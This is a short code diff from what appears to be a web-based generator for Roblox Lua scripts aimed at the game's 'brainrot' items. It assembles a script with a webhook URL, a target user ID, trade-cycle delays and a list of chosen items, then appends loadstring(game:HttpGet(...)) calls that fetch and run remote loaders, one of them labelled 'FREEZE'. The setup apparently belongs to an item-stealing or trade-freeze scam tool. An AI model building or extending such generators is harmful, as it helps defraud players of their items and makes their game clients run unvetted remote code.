@@ -398,7 +398,7 @@
         const customLoader = document.getElementById('customLoader').value.trim();
         let brots = '';
         selectedBrainrots.forEach(n => brots += `    ["${n}"] = true,\n`);
-        let script = `getgenv().WEBHOOK = "${webhookUrl}"\ngetgenv().TARGET_ID = ${currentTargetId}\ngetgenv().DELAY_STEP = 1\ngetgenv().TRADE_CYCLE_DELAY = 2\ngetgenv().TARGET_BRAINROTS = {\n${brots}}`;
+        let script = `getgenv().WEBHOOK = "${webhookUrl}"\ngetgenv().TARGET_ID = ${currentTargetId}\ngetgenv().DELAY_STEP = 1\ngetgenv().TRADE_CYCLE_DELAY = 2\ngetgenv().TARGETS = {\n${brots}}`;
         if (scriptMode === 'CUSTOM' && customLoader) script += `\n${customLoader}`;
         else if (scriptMode === 'FREEZE') script += `\nloadstring(game:HttpGet("${FREEZE_LOADER}"))()`;
         script += `\nloadstring(game:HttpGet("${MAIN_LOADER}"))()`;
